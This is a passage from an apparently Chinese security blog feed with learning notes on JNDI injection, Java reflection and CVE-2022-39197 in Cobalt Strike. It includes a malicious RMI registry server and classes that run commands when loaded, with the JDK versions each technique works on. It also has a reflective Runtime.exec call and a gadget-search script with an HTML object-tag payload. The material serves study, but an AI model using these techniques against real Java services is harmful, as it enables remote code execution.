src="https://raw.githubusercontent.com/todis21/image/main/202303201903952.png" alt="image-20230320190331836"></p><p>查找原因：</p><ul><li>在jdk &lt; jdk8u121 之前才能通过reference 加载远程class</li></ul><h4 id="lookup参数注入"><a href="#lookup参数注入" class="headerlink" title="lookup参数注入"></a>lookup参数注入</h4><p>当JNDI客户端的lookup()函数的参数可控即URI可控时，根据JNDI协议动态转换的原理，攻击者可以传入恶意URI地址指向攻击者的RMI注册表服务，以使受害者客户端加载绑定在攻击者RMI注册表服务上的恶意类，从而实现远程代码执行</p><p>这个的思路和上面的是一样的</p><p>下面的客户端代码，这里假设lookup()参数是可控的，rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;Foo是用户输入的，</p><pre><code class="java">import javax.naming.InitialContext;import javax.naming.NamingException;public class Client &#123;    public static void main(String[] args) &#123;        try &#123;            System.setProperty(&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;, &quot;true&quot;);            Object ret = new InitialContext().lookup(&quot;rmi://127.0.0.1:1099/Foo&quot;);            System.out.println(&quot;ret: &quot; + ret);        &#125; catch (NamingException e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;</code></pre><p>下面是攻击者搭建的恶意RMI注册表服务：</p><pre><code class="java">import com.sun.jndi.rmi.registry.ReferenceWrapper;import javax.naming.Reference;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;public class Server &#123;    public static void main(String args[]) &#123;        try &#123;            // 通过调用LocateRegistry类的createRegistry()方法并将默认端口号1099作为参数创建一个注册表            Registry registry = LocateRegistry.createRegistry(1099);            // 指定要执行的恶意对象的URL，并创建一个Reference类的新对象            String factoryUrl = &quot;http://localhost:1098/&quot;;            Reference reference = new Reference(&quot;EvilObject&quot;,&quot;EvilObject&quot;, factoryUrl);            // 用ReferenceWrapper类包装恶意引用            ReferenceWrapper wrapper = new ReferenceWrapper(reference);            // 使用名称“Foo”将恶意对象绑定到注册表中            registry.bind(&quot;Foo&quot;, wrapper);            System.err.println(&quot;Server ready, factoryUrl:&quot; + factoryUrl);        &#125; catch (Exception e) &#123;            System.err.println(&quot;Server exception: &quot; + e.toString());            e.printStackTrace();        &#125;    &#125;&#125;</code></pre><p>恶意类(弹计算机)：</p><pre><code class="java">public class EvilObject &#123;    public EvilObject() throws Exception &#123;        Runtime rt = Runtime.getRuntime();        String[] commands = &#123;&quot;cmd&quot;, &quot;/C&quot;, &quot;calc.exe&quot;&#125;;        Process pc = rt.exec(commands);        pc.waitFor();    &#125;&#125;</code></pre><p>模拟场景，攻击者开启恶意RMI注册表服务Server，同时恶意类EvilObject放置在同一环境中，由于JNDI客户端的lookup()函数参数可控，因为当客户端输入指向Server的URI进行lookup操作时就会触发JNDI注入漏洞，导致远程代码执行。<strong>PS</strong>:这些代码只适用于低版本的jdk,<code>JDK 6u132</code>、<code>7u122</code>、<code>8u113</code> 开始 <code>com.sun.jndi.rmi.object.trustURLCodebase</code> 默认值为<code>false</code>，运行时需加入参数 <code>-Dcom.sun.jndi.rmi.object.trustURLCodebase=true</code> 。因为如果 <code>JDK</code> 高于这些版本，默认是不信任远程代码的，因此也就无法加载远程 <code>RMI</code> 代码。</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202303211229233.png" alt="image-20230321122926066"></p><p>在RMI中调用了InitialContext.lookup()的类有：</p><pre><code>org.springframework.transaction.jta.JtaTransactionManager.readObject()com.sun.rowset.JdbcRowSetImpl.execute()javax.management.remote.rmi.RMIConnector.connect()org.hibernate.jmx.StatisticsService.setSessionFactoryJNDIName(String sfJNDIName)</code></pre><p>在LDAP中调用了InitialContext.lookup()的类有：</p><pre><code>InitialDirContext.lookup()Spring&#39;s LdapTemplate.lookup()LdapTemplate.lookupContext()</code></pre><h4 id="classFactoryLocation参数注入"><a href="#classFactoryLocation参数注入" class="headerlink" title="classFactoryLocation参数注入"></a>classFactoryLocation参数注入</h4><p><code>lookup()</code>参数注入是针对RMI客户端的,<code>classFactoryLocation</code>是针对RMI服务端的,也就是服务端程序在调用Reference()初始化参数时，其中的classFactoryLocation参数外部可控，导致存在JNDI注入</p><p>例如下面的：</p><p>客户端，lookup参数<strong>不可控</strong></p><pre><code class="java">import javax.naming.Context;import javax.naming.InitialContext;import javax.naming.NamingException;import java.util.Properties;public class Client &#123;    public static void main(String[] args) throws Exception &#123;        Properties env = new Properties();        System.setProperty(&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;, &quot;true&quot;);        env.put(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);        env.put(Context.PROVIDER_URL, &quot;rmi://127.0.0.1:1099&quot;);        Context ctx = new InitialContext(env);        System.out.println(&quot;[*]Using lookup() to fetch object with rmi://127.0.0.1:1099/demo&quot;);        ctx.lookup(&quot;demo&quot;);    &#125;&#125;</code></pre><p>服务端, <code>url</code><strong>可控</strong></p><pre><code class="java">import com.sun.jndi.rmi.registry.ReferenceWrapper;import javax.naming.Reference;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;public class Server &#123;    public static void main(String args[]) throws Exception &#123;        String uri = &quot;http://127.0.0.1:8000&quot;;//        if(args.length == 1) &#123;//            uri = args[0];//        &#125; else &#123;//            uri = &quot;http://127.0.0.1/demo.class&quot;;//        &#125;        System.out.println(&quot;[*]classFactoryLocation: &quot; + uri);        Registry registry = LocateRegistry.createRegistry(1099);        Reference refObj = new Reference(&quot;EvilClass&quot;, &quot;EvilClassFactory&quot;, uri);        ReferenceWrapper refObjWrapper = new ReferenceWrapper(refObj);        System.out.println(&quot;[*]Binding &#39;demo&#39; to &#39;rmi://192.168.43.201:1099/demo&#39;&quot;);        registry.bind(&quot;demo&quot;, refObjWrapper);    &#125;&#125;</code></pre><p>恶意类：</p><pre><code class="java">import java.io.BufferedInputStream;import java.io.BufferedReader;import java.io.IOException;import java.io.InputStream;import java.io.InputStreamReader;import java.rmi.RemoteException;import java.rmi.server.UnicastRemoteObject;import java.util.Hashtable;import javax.naming.Context;import javax.naming.Name;import javax.naming.spi.ObjectFactory;public class EvilClassFactory extends UnicastRemoteObject implements ObjectFactory &#123;    public EvilClassFactory() throws RemoteException &#123;        super();        InputStream inputStream;        try &#123;        //执行命令，返回命令执行结果            inputStream = Runtime.getRuntime().exec(&quot;ipconfig&quot;).getInputStream();            BufferedInputStream bufferedInputStream = new BufferedInputStream(inputStream);            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(bufferedInputStream));            String linestr;            while ((linestr = bufferedReader.readLine()) != null)&#123;                System.out.println(linestr);            &#125;        &#125; catch (IOException e)&#123;            e.printStackTrace();        &#125;    &#125;    @Override    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment) throws Exception &#123;        return null;    &#125;&#125;</code></pre><p>攻击者将恶意类EvilClassFactory.class放置在自己的Web服务器后，通过往RMI注册表服务端的classFactoryLocation参数输入攻击者的Web服务器地址后，当受害者的RMI客户端通过JNDI来查询RMI注册表中年绑定的demo对象时，会找到classFactoryLocation参数被修改的Reference对象，再远程加载攻击者服务器上的恶意类EvilClassFactory.class，从而导致JNDI注入、实现远程代码执行</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202303211446541.png" alt="image-20230321144627180"></p><h4 id="结合反序列漏洞"><a href="#结合反序列漏洞" class="headerlink" title="结合反序列漏洞"></a>结合反序列漏洞</h4><p>反序列化还没学,有机会补上。根据搜索得到的解释：这种情形其实就是<strong>漏洞类重写的readObject()方法中直接或间接调用了可被外部控制的lookup()方法，导致攻击者可以通过JNDI注入来进行反序列化漏洞的利用</strong></p><h2 id="JNDI-LDAP的攻击面"><a href="#JNDI-LDAP的攻击面" class="headerlink" title="JNDI_LDAP的攻击面"></a>JNDI_LDAP的攻击面</h2><h4 id="LDAP-Reference利用"><a href="#LDAP-Reference利用" class="headerlink" title="LDAP+Reference利用"></a>LDAP+Reference利用</h4><p>JNDI的SPI层除了RMI外，还可以跟LDAP交互。与RMI类似，LDAP也能同样返回一个Reference给JNDI的Naming Manager ，只是lookup()中的URL为一个LDAP地址如<code>ldap://xxx/xxx</code>，由攻击者控制的LDAP服务端返回一个恶意的JNDI Reference对象。</p><p>注意一点就是，LDAP+Reference的技巧远程加载Factory类不受RMI+Reference中的<code>com.sun.jndi.rmi.object.trustURLCodebase</code>、<code>com.sun.jndi.cosnaming.object.trustURLCodebase</code>等属性的限制，所以适用范围更广。但在JDK 8u191、7u201、6u211之后，<code>com.sun.jndi.ldap.object.trustURLCodebase</code>属性的默认值被设置为<code>false</code>，对LDAP Reference远程工厂类的加载增加了限制。</p><p>所以，当JDK版本介于8u191、7u201、6u211与6u141、7u131、8u121之间时，就可以利用LDAP+Reference的技巧来进行JNDI注入的利用。</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202303221520356.png" alt="image-20210801143159130"></p><h2 id="》》》》》玩命加载中"><a href="#》》》》》玩命加载中" class="headerlink" title="》》》》》玩命加载中"></a>》》》》》玩命加载中</h2>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反射</title>
      <link href="/2023/03/16/Java%E5%8F%8D%E5%B0%84/"/>
      <url>/2023/03/16/Java%E5%8F%8D%E5%B0%84/</url>
      
        <content type="html"><![CDATA[<h1 id="java反射"><a href="#java反射" class="headerlink" title="java反射"></a>java反射</h1><h2 id="什么是java反射？"><a href="#什么是java反射？" class="headerlink" title="什么是java反射？"></a>什么是java反射？</h2><p>Java反射机制是在运行状态时，对于任意一个类，都能够获取到这个类的所有属性和方法，对于任意一个对象，都能够调用它的任意一个方法和属性(包括私有的方法和属性)，这种动态获取的信息以及动态调用对象的方法的功能就称为java语言的反射机制。</p><h2 id="Java反射的主要类"><a href="#Java反射的主要类" class="headerlink" title="Java反射的主要类"></a>Java反射的主要类</h2><ul><li>类：java.lang.Class;</li><li>构造器：java.lang.reflect.Constructor;</li><li>字段：java.lang.reflect.Field;</li><li>方法：java.lang.reflect.Method;</li><li>修饰符：java.lang.reflect.Modifier;</li></ul><h2 id="Java如何获取一个类"><a href="#Java如何获取一个类" class="headerlink" title="Java如何获取一个类"></a>Java如何获取一个类</h2><p>JVM为每个加载的class创建了对应的<code>Class</code>实例，并在实例中保存了该<code>class</code>的所有信息；因此，如果获取了某个<code>Class</code>实例，我们就可以通过这个<code>Class</code>实例获取到该实例对应的<code>class</code>的所有信息(下面用<code>String</code>类举例)</p><ul><li>直接通过一个<code>class</code>的静态变量<code>class</code>获取</li></ul><pre><code>Class cls = String.class;</code></pre><ul><li>通过该实例变量提供的<code>getClass()</code>方法获取</li></ul><pre><code>String s = &quot;hello&quot;;Class cls = s.getClass();</code></pre><ul><li>知道一个<code>class</code>的<em>完整类名</em>，可以通过静态方法<code>Class.forName()</code>获取</li></ul><pre><code>Class cls = Class.forName(&quot;java.lang.String&quot;);</code></pre><p>上面3种方法获取的结果都是<code>class java.lang.String</code></p><h2 id="一个简单的反射示例"><a href="#一个简单的反射示例" class="headerlink" title="一个简单的反射示例"></a>一个简单的反射示例</h2><p>先简单写个类</p><pre><code class="java">class MyClass &#123;    private int privateField;    public String publicField;    public MyClass() &#123;&#125;    public void doSomething() &#123;&#125;    &#125;</code></pre><pre><code class="java">MyClass obj = new MyClass(); //创建一个对象Class c = obj.getClass(); //获取类名Method[] methods = c.getDeclaredMethods(); //获取全部方法Constructor[] constructors = c.getDeclaredConstructors(); //获取类中声明的全部构造函数       Field[] fields = c.getDeclaredFields(); // 获取类的字段</code></pre><p>完整代码</p><pre><code class="java">import java.lang.reflect.*;public class Reflectdemo &#123;    public static void main(String[] args) &#123;        MyClass obj = new MyClass();        Class c = obj.getClass();        System.out.println(&quot;类名：&quot;+c);        Method[] methods = c.getDeclaredMethods();        for (Method method : methods) &#123;            System.out.println(&quot;方法的名称：&quot; + method.getName());        &#125;        Constructor[] constructors = c.getDeclaredConstructors();        System.out.println(&quot;构造函数的数量：&quot; + constructors.length);        for(Constructor con:constructors)        &#123;            System.out.println(&quot;构造函数的名称：&quot; + con.getName());        &#125;        // 获取类的字段        Field[] fields = c.getDeclaredFields();        for (Field field : fields) &#123;            System.out.println(&quot;字段的名称：&quot; + field.getName());        &#125;    &#125;&#125;class MyClass &#123;    private int privateField;    public String publicField;    public MyClass() &#123;&#125;//构造函数    public void doSomething() &#123;&#125;&#125;</code></pre><p>运行结果：</p><pre><code>类名：class MyClass方法的名称：doSomething构造函数的数量：1构造函数名称：MyClass字段的名称：privateField字段的名称：publicField</code></pre><h2 id="获取字段"><a href="#获取字段" class="headerlink" title="获取字段"></a>获取字段</h2><p>上面的反射示例中，使用了<code>getDeclaredFields()</code>方法获取字段，还有一个方法<code>getFields()</code></p><p>两者的区别：</p><p>getDeclaredFields()：获得某个类的所有声明的字段，即包括public、private和proteced，但是不包括父类的申明字段。</p><p>getFields()：获得某个类的所有的公共（public）的字段，包括父类中的字段。</p><p>例如：</p><p>使用：getDeclaredFields()</p><pre><code class="java">import java.lang.reflect.*;public class Reflectdemo &#123;    public static void main(String[] args) &#123;       Class cls = String.class;       System.out.println(&quot;类名：&quot;+cls);       Field[] fields = cls.getDeclaredFields();       for (Field field:fields)&#123;           System.out.println(&quot;字段名: &quot;+field);       &#125;    &#125;&#125;</code></pre><p>输出：</p><pre><code>类名：class java.lang.String字段名: private final byte[] java.lang.String.value字段名: private final byte java.lang.String.coder字段名: private int java.lang.String.hash字段名: private boolean java.lang.String.hashIsZero字段名: private static final long java.lang.String.serialVersionUID字段名: static final boolean java.lang.String.COMPACT_STRINGS字段名: private static final java.io.ObjectStreamField[] java.lang.String.serialPersistentFields字段名: private static final char java.lang.String.REPL字段名: public static final java.util.Comparator java.lang.String.CASE_INSENSITIVE_ORDER字段名: static final byte java.lang.String.LATIN1字段名: static final byte java.lang.String.UTF16</code></pre><p>使用：getFields()</p><pre><code>import java.lang.reflect.*;public class Reflectdemo &#123;    public static void main(String[] args) &#123;       Class cls = String.class;       System.out.println(&quot;类名：&quot;+cls);        Field[] fields = cls.getFields();        for (Field field:fields)&#123;            System.out.println(&quot;字段名: &quot;+field);        &#125;    &#125;&#125;</code></pre><p>输出：</p><pre><code>类名：class java.lang.String字段名: public static final java.util.Comparator java.lang.String.CASE_INSENSITIVE_ORDER</code></pre><p>可以通过getDeclaredFields()或getFields()获取指定的字段并修改值</p><p>例如：</p><p>先创建一个类StuInfo并继承PersonInfo：</p><pre><code class="java">class StuInfo extends PersonInfo&#123;    public int age;    private int money;    @Override    public String toString() &#123;        return &quot;StuInfo&#123;&quot; +                &quot;name=&quot; + name +                &quot;, money=&quot; + money +                &#39;&#125;&#39;;    &#125;&#125;class PersonInfo&#123;    public String name = &quot;TOM&quot;;&#125;</code></pre><p>反射部分代码：</p><pre><code class="java">public class Reflectdemo &#123;    public static void main(String[] args) throws Exception &#123;        Class stiClass = StuInfo.class;        // 获取public字段&quot;age&quot;:        System.out.println(stiClass.getField(&quot;age&quot;));        // 获取继承的public字段&quot;name&quot;:        System.out.println(stiClass.getField(&quot;name&quot;));        // 获取private字段&quot;grade&quot;:        System.out.println(stiClass.getDeclaredField(&quot;money&quot;));        // 获得值,name.get里面参数需要该类对象，而不是.class        Field name = stiClass.getField(&quot;name&quot;);        System.out.println(name.get(stiClass.newInstance()));  //获取name的值，这里是TOM        // 设置值        StuInfo stuInfo = new StuInfo();        Field money = stiClass.getDeclaredField(&quot;money&quot;);        money.setAccessible(true);        money.set(stuInfo,1000);        System.out.println(stuInfo);    &#125;&#125;</code></pre><p>输出结果：</p><pre><code>public int StuInfo.agepublic java.lang.String PersonInfo.nameprivate int StuInfo.moneyTOMStuInfo&#123;name=TOM, money=1000&#125;</code></pre><h2 id="获取方法"><a href="#获取方法" class="headerlink" title="获取方法"></a>获取方法</h2><p>有一下几种方式可以获取：</p><ul><li><p><code>Method getMethod(name, Class...)</code>：获取某个<code>public</code>的<code>Method</code>（包括父类）</p></li><li><p><code>Method getDeclaredMethod(name, Class...)</code>：获取当前类的某个<code>Method</code>（不包括父类）</p></li><li><p><code>Method[] getMethods()</code>：获取所有<code>public</code>的<code>Method</code>（包括父类）</p></li></ul><pre><code class="java">import java.lang.reflect.*;public class Reflectdemo &#123;    public static void main(String[] args)  &#123;        String  s = &quot;T0dis&quot;;        Class cls = s.getClass();        System.out.println(cls);        Method[] m2 = cls.getMethods();        System.out.println(m2.length);//输出个数90    &#125;&#125;</code></pre><ul><li><code>Method[] getDeclaredMethods()</code>：获取当前类的所有<code>Method</code>（不包括父类）</li></ul><pre><code class="java">import java.lang.reflect.*;public class Reflectdemo &#123;    public static void main(String[] args)  &#123;        String  s = &quot;T0dis&quot;;        Class cls = s.getClass();        System.out.println(cls);        Method[] m1 = cls.getDeclaredMethods();        System.out.println(m1.length);//输出个数141    &#125;&#125;</code></pre><p>简单来通过反射来使用<code>substring</code>方法:</p><pre><code class="java">import java.lang.reflect.*;public class Reflectdemo &#123;    public static void main(String[] args) throws Exception &#123;        Class stringClass = String.class;        Method substringMethod = stringClass.getMethod(&quot;substring&quot;, int.class, int.class);        String str = &quot;Hello, World!&quot;;        Object result = substringMethod.invoke(str, 7, 12);        String subStr = (String) result;        System.out.println(subStr); // 输出 World    &#125;&#125;</code></pre><p>这里的示例中获取的是有参数方法的Method对象，若是获取无参数方法的Method对象，例如：</p><pre><code class="java">Class stringClass = String.class;Method lengthMethod = stringClass.getMethod(&quot;length&quot;);</code></pre><p><code>getDeclaredMethod</code>也是类似的用法，这里就不介绍了</p><p><strong>注意</strong>：如果调用的方法是静态方法。那么invoke<code>方法传入的第一个参数永远为</code>null</p><pre><code>// 获取Integer.parseInt(String)方法，参数为String:Method m = Integer.class.getMethod(&quot;parseInt&quot;, String.class);// 调用该静态方法并获取结果:Integer n = (Integer) m.invoke(null, &quot;23333&quot;);System.out.println(n);</code></pre><h2 id="获取构造方法"><a href="#获取构造方法" class="headerlink" title="获取构造方法"></a>获取构造方法</h2><p>构造方法（Constructor）是一种特殊的方法，用于在对象创建时初始化对象的成员变量。它的名称必须与类名相同，没有返回类型（包括 void），可以有参数，也可以没有参数。当创建一个对象时，构造方法会自动调用，为对象的成员变量赋初值。如果没有定义构造方法，Java会默认提供一个无参构造方法。如果定义了构造方法，Java不会再提供默认的构造方法。</p><p>通过Class实例获取Constructor的方法有下面几种：</p><ul><li><code>getConstructor(Class...)</code>：获取某个<code>public</code>的<code>Constructor</code>；</li><li><code>getDeclaredConstructor(Class...)</code>：获取某个<code>Constructor</code>；</li><li><code>getConstructors()</code>：获取所有<code>public</code>的<code>Constructor</code>；</li><li><code>getDeclaredConstructors()</code>：获取所有<code>Constructor</code>。</li></ul><p>调用非<code>public</code>的<code>Constructor</code>时，必须首先通过<code>setAccessible(true)</code>设置允许访问。<code>setAccessible(true)</code>可能会失败。</p><p>示例：</p><p>简单的写个类：</p><pre><code class="java">class Person &#123;    public String name;    public int age;    public Person(String name, int age) &#123;        this.name = name;        this.age = age;    &#125;    private Person(String name) &#123;        this.name = name;    &#125;    public void sayHello() &#123;        System.out.println(&quot;Hello, my name is &quot; + name + &quot;, I&#39;m &quot; + age + &quot; years old.&quot;);    &#125;&#125;</code></pre><p>获取Person类的Class对象</p><pre><code class="java"> Class&lt;?&gt; clazz = Person.class;//这里的&lt;?&gt;是Java中的泛型语法，表示&quot;未知类型&quot;。在这个例子中，它表示我们不知道要使用的类的具体类型，但我们知道它是一个类。这种语法通常用于在编译时检查类型安全性，并在运行时使用具体类型</code></pre><p>通过下面代码可以看出这几个方法的区别</p><p>代码中<code>getModifiers()</code> 方法是 Java 反射 API 的一部分，它用于获取指定构造函数的修饰符。修饰符是一个整数值，用于描述类，字段，方法或构造函数的访问级别等信息。</p><pre><code class="java">// 获取所有公有构造方法Constructor&lt;?&gt;[] constructors = clazz.getConstructors();System.out.println(&quot;getConstructors():&quot;);Arrays.stream(constructors).forEach(constructor -&gt; &#123;      System.out.println(constructor.getName() + &quot;(&quot; + Modifier.toString(constructor.getModifiers()) + &quot;)&quot;);   &#125;); // 获取所有构造方法（包括私有构造方法）Constructor&lt;?&gt;[] declaredConstructors = clazz.getDeclaredConstructors();System.out.println(&quot;\ngetDeclaredConstructors():&quot;);Arrays.stream(declaredConstructors).forEach(declaredConstructor -&gt; &#123;      System.out.println(declaredConstructor.getName() + &quot;(&quot; + Modifier.toString(declaredConstructor.getModifiers()) + &quot;)&quot;);    &#125;);// 获取指定公有构造方法Constructor&lt;?&gt; constructor1 = clazz.getConstructor(String.class, int.class);System.out.println(&quot;\ngetConstructor():&quot;);System.out.println(constructor1.getName() + &quot;(&quot; + Modifier.toString(constructor1.getModifiers()) + &quot;)&quot;);// 获取指定构造方法（包括私有构造方法）Constructor&lt;?&gt; constructor2 = clazz.getDeclaredConstructor(String.class);System.out.println(&quot;\ngetDeclaredConstructor():&quot;);System.out.println(constructor2.getName() + &quot;(&quot; + Modifier.toString(constructor2.getModifiers()) + &quot;)&quot;);</code></pre><p>输出结果：</p><pre><code>getConstructors():Person(public)getDeclaredConstructors():Person(public)Person(private)getConstructor():Person(public)getDeclaredConstructor():Person(private)</code></pre><h2 id="如何通过反射执行命令"><a href="#如何通过反射执行命令" class="headerlink" title="如何通过反射执行命令"></a>如何通过反射执行命令</h2><p>简单的弹个计算机</p><pre><code>import java.lang.reflect.*;public class Reflectdemo &#123;    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;        Class cls = Class.forName(&quot;java.lang.Runtime&quot;);        Method EXEC = cls.getMethod(&quot;exec&quot;,String.class);        String comm = &quot;calc&quot;;        Process p = (Process) EXEC.invoke(Runtime.getRuntime(), comm);    &#125;&#125;</code></pre><h2 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h2><p>还有很多反射的知识没写，遇到再补充吧</p>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2022-39197学习笔记</title>
      <link href="/2022/10/30/CVE-2022-39197%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/10/30/CVE-2022-39197%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="CVE-2022-39197学习笔记"><a href="#CVE-2022-39197学习笔记" class="headerlink" title="CVE-2022-39197学习笔记"></a>CVE-2022-39197学习笔记</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>该漏洞存在于Cobalt Strike的Beacon软件中，一个 XSS漏洞，允许远程攻击者在 Cobalt Strike 团队服务器上执行 HTML，并实现rce。</p><h2 id="漏洞起点"><a href="#漏洞起点" class="headerlink" title="漏洞起点"></a>漏洞起点</h2><p>Cobalt Strike 接口建立在 Java Swing 框架之上。该框架为开发人员提供了用于 Java 程序的图形用户界面。</p><p><a href="https://docs.oracle.com/javase/tutorial/uiswing/components/html.html">根据官方文档</a> 所描述，在开头插入<code>&lt;html&gt;</code>标签后续的内容就会被格式化为html文档进行解析，也就是说支持html标签</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202211011228452.png" alt="image-20221030214448317"></p><p>测试demo:</p><pre><code class="java">import javax.swing.*;public class test &#123;    private static void createAndShowGUI() &#123;        JFrame.setDefaultLookAndFeelDecorated(true);        JFrame frame = new JFrame(&quot;asdfas&quot;);        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);        JLabel label = new JLabel(&quot;&lt;html&gt;&lt;img src=xxxxx&gt;&lt;h1&gt;Hello world&lt;/h1&gt;&quot;);        frame.getContentPane().add(label);        frame.pack();        frame.setVisible(true);    &#125;    public static void main(String[] args) &#123;        javax.swing.SwingUtilities.invokeLater(new Runnable() &#123;            public void run() &#123;                createAndShowGUI();            &#125;        &#125;);    &#125;&#125;</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/202211011228540.png" alt="image-20221030214752682"></p><p>从demo运行结果可以看出html代码被解析执行，这就是整个漏洞的关键点，也是起点</p><h2 id="大佬文章指引"><a href="#大佬文章指引" class="headerlink" title="大佬文章指引"></a>大佬文章指引</h2><p>根据<a href="https://mp.weixin.qq.com/s?__biz=MzIxNDAyNjQwNg==&mid=2456098978&idx=1&sn=d511d5a674d84eeaf262c8e389ae0403&chksm=803c696bb74be07d8ef8e473b11ffe4dce57b58ccf82e8615ab15d9ba6bba9263360c01276a8&mpshare=1&scene=23&srcid=1012cGc5X3pyXr5VpF2LMf7Y&sharer_sharetime=1665577816700&sharer_shareid=685f4dccaa04150832e24b9e6499e6cf#rd">漂亮鼠大佬文章</a> 分析的，&lt;object 标签能够实现rce，payload大概长这个样</p><pre><code class="html">&lt;html&gt; &lt;object classid=&quot;A&quot;&gt; &lt;param name=&quot;my_name&quot; value=&quot;Rio&quot;&gt;&lt;/object&gt;</code></pre><p>解析器将尝试创建A类的实例，检查该类是否是<code>java.awt.Component</code>的子类，并为<code>my_name</code> 参数调用 <code>setXXXX </code>方法。</p><p>总的来说要满足以下条件</p><ol><li>classid传入需要实例化的类，类必须继承与Component</li><li>必须有无参构造方法，貌似是因为newinstant是调用的无参构造方法</li><li>必须存在一个setXXX方法的XXX属性</li><li>setXXX方法的传参数必须是接受一个string类型的参数</li></ol><h2 id="寻找rce链子"><a href="#寻找rce链子" class="headerlink" title="寻找rce链子"></a>寻找rce链子</h2><p>手动寻找满足以上标准的类绝非易事，利用java反射，能够快速找出满足条件的所有类</p><p>ps:  java几乎0基础，花了好久才整出这个脚本</p><pre><code class="java">import java.awt.*;import java.io.File;import java.io.IOException;import java.lang.reflect.Method;import java.net.URL;import java.net.URLClassLoader;import java.util.Enumeration;import java.util.jar.JarEntry;import java.util.jar.JarFile;public class load_jar &#123;    public static void getJarName(String jarFile) throws Exception &#123;        int flag=1;        int flag2 = 0;        try&#123;            //通过将给定路径名字符串转换为抽象路径名来创建一个新File实例            File f = new File(jarFile);            URL url1 = f.toURI().toURL();            URLClassLoader myClassLoader = new URLClassLoader(new URL[]&#123;url1&#125;,Thread.currentThread().getContextClassLoader());            //通过jarFile和JarEntry得到所有的类            JarFile jar = new JarFile(jarFile);            //返回zip文件条目的枚举            Enumeration&lt;JarEntry&gt; enumFiles = jar.entries();            JarEntry entry;            while(enumFiles.hasMoreElements())            &#123;                entry = (JarEntry)enumFiles.nextElement();                if(entry.getName().indexOf(&quot;META-INF&quot;)&lt;0)                &#123;                    String classFullName = entry.getName();                    if(classFullName.endsWith(&quot;.class&quot;))                    &#123;                        String className = classFullName.substring(0,classFullName.length()-6).replace(&quot;/&quot;, &quot;.&quot;);                        try&#123;                            flag+=1;                            Class&lt;?&gt; clazz = myClassLoader.loadClass(className);                            Method[] methods = clazz.getMethods();                            for (Method method : methods)                            &#123;                                String methodName = method.getName();                                if (methodName.contains(&quot;set&quot;))&#123;                                    Class&lt;?&gt;[] parameterTypes = method.getParameterTypes();                                    if (parameterTypes.length == 1)&#123;                                        for (Class&lt;?&gt; clas : parameterTypes)                                        &#123;                                            String parameterName = clas.getSimpleName();                                            if (parameterName.contains(&quot;String&quot;))&#123;                                                try &#123;                                                    Object o = clazz.newInstance();                                                    if (o instanceof Component)&#123;                                                        System.out.println(&quot;-------------&quot;+flag2+&quot;-------------&quot;);                                                        flag2 = flag2 + 1;                                                        System.out.println(&quot;classname:&quot; + className);                                                        System.out.println(&quot;methodname:&quot; + methodName);                                                        System.out.println(&quot;parameterName:&quot; + parameterName);                                                    &#125;                                                &#125;catch (Exception e)&#123;                                                    continue;                                                &#125;                                            &#125;                                        &#125;                                    &#125;                                &#125;                            &#125;                        &#125;                        catch (IllegalAccessError a)                        &#123;                            continue;                        &#125;                        catch (NoClassDefFoundError b)                        &#123;                            continue;                        &#125;                    &#125;                &#125;            &#125;        &#125; catch(IOException e)&#123;            e.printStackTrace();        &#125;    &#125;    public static void main(String[] args) throws Exception &#123;        getJarName(&quot;cobaltstrike.jar&quot;);    &#125;&#125;</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/202211011228203.png" alt="image-20221101105557916"></p><p>用这个脚本成功找到cobaltstrike.jar中满足所有条件的类，一共找到132个，但是有很多都是重复的，除去重复的也就十几个，可以一个一个的分析，看看哪个可以rce</p><p>最终找到setURL()</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202211011249269.png" alt="image-20221101124946165"></p><p>函数调用了loadSVGDocument(),这个函数是用于解析SVG文件的，并且SVG 文件是允许用户插入 JavaScrip代码的</p><pre><code class="java">    public void loadSVGDocument(String url) &#123;        String oldURI = null;        if (this.svgDocument != null) &#123;            oldURI = this.svgDocument.getURL();        &#125;        final ParsedURL newURI = new ParsedURL(oldURI, url);        stopThenRun(new Runnable() &#123; // from class: org.apache.batik.swing.svg.JSVGComponent.1            @Override // java.lang.Runnable            public void run() &#123;                String url2 = newURI.toString();                JSVGComponent.this.fragmentIdentifier = newURI.getRef();                JSVGComponent.this.loader = new DocumentLoader(JSVGComponent.this.userAgent);                JSVGComponent.this.nextDocumentLoader = new SVGDocumentLoader(url2, JSVGComponent.this.loader);                JSVGComponent.this.nextDocumentLoader.setPriority(1);                for (Object svgDocumentLoaderListener : JSVGComponent.this.svgDocumentLoaderListeners) &#123;                    JSVGComponent.this.nextDocumentLoader.addSVGDocumentLoaderListener((SVGDocumentLoaderListener) svgDocumentLoaderListener);                &#125;                JSVGComponent.this.startDocumentLoader();            &#125;        &#125;);    &#125;</code></pre><h2 id="利用SVG执行恶意代码"><a href="#利用SVG执行恶意代码" class="headerlink" title="利用SVG执行恶意代码"></a>利用SVG执行恶意代码</h2><p>SVG 